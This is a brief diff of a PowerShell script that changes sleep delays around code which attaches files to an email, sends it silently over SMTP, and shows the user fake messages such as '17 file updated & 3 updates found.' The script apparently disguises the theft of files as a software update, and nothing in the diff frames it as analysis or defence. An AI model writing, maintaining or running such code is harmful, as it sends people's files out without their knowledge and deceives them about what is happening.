@@ -110,10 +110,10 @@ else{
        Start-Sleep -Milliseconds 10
        $msg.Attachments.Add($file1)
      }
-
+    Start-Sleep -Milliseconds 1000
     echo "This process will take some time. Please wait.."
     $smtp.Send($msg) | Out-Null
-    Start-Sleep -Milliseconds 3000
+    Start-Sleep -Milliseconds 4000
     echo '17 file updated & 3 updates found.' 
      
     }   
